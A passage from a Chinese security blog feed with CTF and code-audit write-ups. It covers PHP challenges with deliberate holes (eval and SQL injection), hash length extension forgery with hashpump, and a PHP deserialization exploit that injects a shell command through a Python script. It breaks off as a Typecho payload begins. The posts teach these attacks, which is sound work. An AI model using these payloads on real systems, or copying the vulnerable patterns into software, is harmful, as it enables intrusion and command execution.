class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">if</span> (!$link) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect to MySQL: '</span> . mysql_error()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择数据库</span></span><br><span class="line">$db = mysql_select_db(<span class="string">"test"</span>, $link);</span><br><span class="line"><span class="keyword">if</span>(!$db)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'select db error'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行sql</span></span><br><span class="line">$password = $_GET[<span class="string">'pwd'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE pass = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">$row1 = mysql_fetch_row($result);</span><br><span class="line">var_dump($row1);</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/12/5gY7ZHLE9mb6UCo.png" alt="quicker_73b1351a-f0f9-4639-b091-ac37b7838d6f.png"></p><h2>challenge-12</h2><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</span><br></pre></td></tr></table></figure></p><p>字符串直接拼接</p><p><code>?hello=);eval(phpinfo());//</code></p><h2>challenge-13</h2><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</span><br><span class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($a))&#123;</span><br><span class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</span><br><span class="line">   ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</span><br><span class="line">   $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</span><br><span class="line">   $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">   $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   $v2=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=@$_GET[<span class="string">'cat'</span>];</span><br><span class="line">$d=@$_GET[<span class="string">'dog'</span>];</span><br><span class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</span><br><span class="line">   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可能是我对json不是很了解，这里必须都使用双引号才行。</p><p>两个不是弱类型的trick：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(0===false) 为false</span><br><span class="line">var_dump(null===false) 为false</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继续分析GitHub上的一个代码审计项目&lt;/p&gt;
&lt;h2&gt;challenge-10&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>哈希扩展攻击继续分析</title>
    <link href="https://prontosil.club/2019/08/12/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90/"/>
    <id>https://prontosil.club/2019/08/12/哈希扩展攻击继续分析/</id>
    <published>2019-08-12T01:38:20.000Z</published>
    <updated>2019-08-14T12:34:59.730Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到了好多针对de1ctf ssrfme题目分析，顺便把之前没搞明白的哈希长度扩展攻击写一下</p><p><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">链接</a>这篇文章讲的很仔细了，分析一下文章中的栗子</p><p>师傅给的<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">代码</a></p><h2>md5的过程</h2><ol><li>MD5 padding</li></ol><blockquote><p>如果输入信息的长度(字节)对64求余的结果不等于56，就需要填充使得对64求余的结果等于56。填充的方法是填充一个x80和xx个0。填充完后，信息的长度为N*64+56(字节)，并且最后8个字节用来记录原始输入信息长度</p></blockquote><ol start="2"><li>MD5 compress这个算法直接到网上找就行</li></ol><p>所以MD5的过程就是：</p><blockquote><p>先进行消息长度的填充(padding)。填充完后，初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法。压缩算法完成后，会产生新的4个Magic number。这样再进行第二个64字节Message block的md5 compress压缩算法。以此类推……直到压缩到最后64个字节的(Message block + padding)，最后得到的Magic number经过hex转化就是最后的md5 hash值</p></blockquote><p>比如md5('admin'),由于padding之后只有64个字节，所以只进行一轮的md5 compress 得到的密文就是：</p><p><code>21232f297a57a5a743894a0e4a801fc3</code></p><p>我们可以从密文推导出4个magic number：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x292f2321L</span><br><span class="line">B=0xa7a5577aL</span><br><span class="line">C=0xe4a8943L</span><br><span class="line">D=0xc31f804aL</span><br></pre></td></tr></table></figure></p><p>这个关系就是大小端转化一下</p><h2>md5长度扩展的攻击过程</h2><p>知道如下三个值：</p><ol><li>md5(salt+message)的值</li><li>message内容</li><li>salt+message长度</li></ol><p>我们可以根据md5(salt+message)的值逆向出最后的四个magic number</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_magic_number</span><span class="params">(self, md5str)</span>:</span></span><br><span class="line">    self.A = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">0</span>:<span class="number">8</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    self.B = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">8</span>:<span class="number">16</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    self.C = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">16</span>:<span class="number">24</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    self.D = struct.unpack(<span class="string">"I"</span>, md5str[<span class="number">24</span>:<span class="number">32</span>].decode(<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><p>这个四个magic number去和m做一下次的md5 compress</p><h2>再理解一下</h2><p>继续又看了一篇师傅的文章，想要好好梳理一下哈希扩展攻击</p><p>师傅是以sha1算法为例讲解的： sha1的流程如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hash0.jpg" alt=""></p><p>sha1算法和md5很相似，也有最初的四个IV，并且是确定的(这是一种很不好的方法但是也是一种无奈的举动)</p><p>一个不足64位的字符串会被padding至64位，并且由于只有一个分组，所以只需要一轮运算即可</p><p>我们在前一次64位padding之后的字符串的基础上加入一些字符，sha1(salt+padding+add_data) 首先这里肯定是要分成两组的，前一组加密后的内容已经知道了，同时产生的新的IV会参与下一次的复杂的数学运算</p><p>而这些IV是能够从第一组的密文中得知的，这就导致下一组加密后的内容实际上我们也可以知道的</p><p>《白帽子讲web安全》上提到，如何利用长度扩展攻击：</p><blockquote><p>LengthExtension 使得可以在原文之后附加任意的值，并计算出新的hash值，最常见的地方就是签名</p></blockquote><ol><li>错误的签名校验算法参数连接时没有使用分隔符，本来是<code>?a=1&amp;b=2&amp;c=3</code>在签名算法中简单地变成了<code>a1b2c3</code></li></ol><p>于是攻击者可以伪造参数<code>?a=1b2c3[...padding....]&amp;b=4&amp;c=5</code></p><p>最终在签名算法中连接时变成了<code>a1b2c3[...padding...]b4c5</code></p><ol start="2"><li><p>附加任意的参数</p></li><li><p>HPP</p></li></ol><p>最简单的防护就是将secret放置在参数的末尾</p><h2>举例</h2><p>大师傅给的栗子：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$role = $_REQUEST[<span class="string">"role"</span>];</span><br><span class="line">$hash = $_REQUEST[<span class="string">"hash"</span>];</span><br><span class="line">$salt = <span class="string">"meme"</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($hash !== md5($salt.$role))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong!'</span>;     </span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $role == <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong, hash cann\'t be admin'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You are "</span>.$role.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Congradulation!'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>已知role为admin，salt的长度为4，hash值为：<code>c7813629f22b6a7d28a08041db3e80a9</code></p><p>我们可以在<code>role</code>后面附加任意的数据使得第一个if被绕过</p><p>用大师傅的脚本：</p><p><code>python md5pad.py c7813629f22b6a7d28a08041db3e80a9 joychou 9</code></p><p>当然也可以这样：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump                                                                                                                        </span><br><span class="line">Input Signature: c7813629f22b6a7d28a08041db3e80a9</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 9</span><br><span class="line">Input Data to Add: joychou</span><br><span class="line">06cf5a94dcda53659f58c0f411ba0bd8</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00joychou</span><br></pre></td></tr></table></figure></p><p>注意第三次输入的数据长度是包括salt在内的</p><h2>参考</h2><p><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">深入理解hash长度扩展攻击（sha1为例）</a><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">Hash Length Extension Attack</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近看到了好多针对de1ctf ssrfme题目分析，顺便把之前没搞明白的哈希长度扩展攻击写一下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://joychou.org/web/hash-length-extension-attack.html&quot; target=&quot;_blan
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="hash" scheme="https://prontosil.club/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化笔记1</title>
    <link href="https://prontosil.club/2019/08/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B01/"/>
    <id>https://prontosil.club/2019/08/11/php反序列化笔记1/</id>
    <published>2019-08-11T07:32:13.000Z</published>
    <updated>2019-08-12T12:31:56.757Z</updated>
    
    <content type="html"><![CDATA[<p>在freebuf上看到了一篇新的php反序列化的文章，借此继续分析一下php反序列化。</p><p>文章中的代码如下：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;    </span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> $method;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line"></span><br><span class="line">       $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> $str;</span><br><span class="line"></span><br><span class="line">   &#125;           </span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">echos</span><span class="params">($host)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       system(<span class="string">"echos $host"</span>.$host);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echos"</span>))) &#123;</span><br><span class="line"></span><br><span class="line">           call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">'hi'</span>;</span><br><span class="line"></span><br><span class="line">$var=<span class="string">'var'</span>;</span><br><span class="line"></span><br><span class="line">$bbb=<span class="string">'bbb'</span>;</span><br><span class="line"></span><br><span class="line">$ccc=<span class="string">'ccc'</span>;</span><br><span class="line"></span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">           $i++;   </span><br><span class="line"></span><br><span class="line">           $$key = $value;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">"doller"</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   var_dump($_GET[<span class="string">'a'</span>]);</span><br><span class="line">   @parse_str($_GET[<span class="string">'a'</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>($var===<span class="string">"give"</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($bbb===<span class="string">"me"</span>)</span><br><span class="line"></span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>($ccc===<span class="string">"flag"</span>)</span><br><span class="line"></span><br><span class="line">           &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span><span class="string">"&lt;br&gt;welcome!&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">                $come=@$_POST[<span class="string">'come'</span>];</span><br><span class="line"></span><br><span class="line">                unserialize($come); </span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">       &#123;<span class="keyword">echo</span> <span class="string">"&lt;br&gt;think about it&lt;br&gt;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"NO"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Can you hack me?&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>有两个小trick需要绕过，都是变量覆盖的漏洞，同时parse_str函数需要接受的是一个字符串，为了在浏览器栏中输入需要将&amp;符号进行URL编码</p><p><code>http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code></p><p>这样就能绕过两个小trick</p><p>之后就是怎么利用那个反序列化了，<code>__construct</code>函数没有什么用，<code>__wakeup</code>方法会将私有属性<code>args</code>通过一个waf函数进行过滤，<code>__destruct</code>函数中有一个危险函数<code>call_user_func_array</code>,注意到调用这个函数的时候传入的是一个数组，其实就是调用这个this类中的一个方法。但是之前的if判断限制了调用的方法只能是<code>echos</code>，分析<code>echos</code>方法发现其中有一个<code>system</code>函数，但是<code>echo</code>错误的拼成了<code>echos</code> 😆</p><p>于是我们的思路就是通过传入反序列化后的值使得echos函数被调用执行我们的命令，这就设计到在Linux或者Windows中一行执行多条命令的方式。</p><p>在Linux中：</p><blockquote><p>&amp;是不管前后命令是否执行成功都会执行前后命令&amp;&amp;是前面的命令执行成功才能执行后面的命令||是前面的命令执行不成功才能执行后面的命令|管道符</p></blockquote><p>构造出反序列化数据如下：</p><p><code>O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;&amp;dir&quot;;}s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;}</code></p><p>但是。。。<img src="https://i.loli.net/2019/08/11/KREArj6U48vMnsl.png" alt="quicker_bbf51071-3a91-4657-8c29-6818d4d0ba4e.png"></p><p><code>var_dump</code>一下发现了：</p><p><code>:\ProgramFiles\phpstudy\PHPTutorial\WWW\test\unserialize.php:104:string 'O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;' (length=44)</code></p><p>发现数据被截断了。。</p><p>var_dump之前的构造的反序列化数据：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;come&quot;:2:&#123;s:10:&quot;comeargs&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;&#125;F:\notes\audit\test.php:8:  ---&gt; echo出来的结果</span><br><span class="line">string(86) &quot;O:4:&quot;come&quot;:2:&#123;s:10:&quot;\000come\000args&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;\000come\000method&quot;;s:5:&quot;echos&quot;;&#125;&quot; ---&gt; var_dump出来的结果</span><br></pre></td></tr></table></figure></p><p>因为php在反序列化数据时：</p><blockquote><p>protected属性的表示方式是在变量名前加个%00*%00private表示方式是在变量名前加上%00类名%00</p></blockquote><p>所以次数的两个<code>private</code>属性都被加上了00阶段符号，于是只能通过python手动编码传输数据了</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag"</span></span><br><span class="line"></span><br><span class="line">n = <span class="string">'00'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">o = <span class="string">'O:4:"come":2:&#123;s:12:"'</span>+n+<span class="string">'come'</span>+n+<span class="string">'method";s:5:"echos";s:10:"'</span>+n+<span class="string">'come'</span>+n+<span class="string">'args";a:1:&#123;i:0;s:4:"&amp;dir";&#125;&#125;"'</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">"come"</span>:o&#125;)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure></p><p>返回的结果如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/unphp0.png" alt=""></p><p>之后如果要读取flag还有几个姿势，但不是本文的重点了</p><h2>typecho反序列化漏洞</h2><p>先放出payload</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span 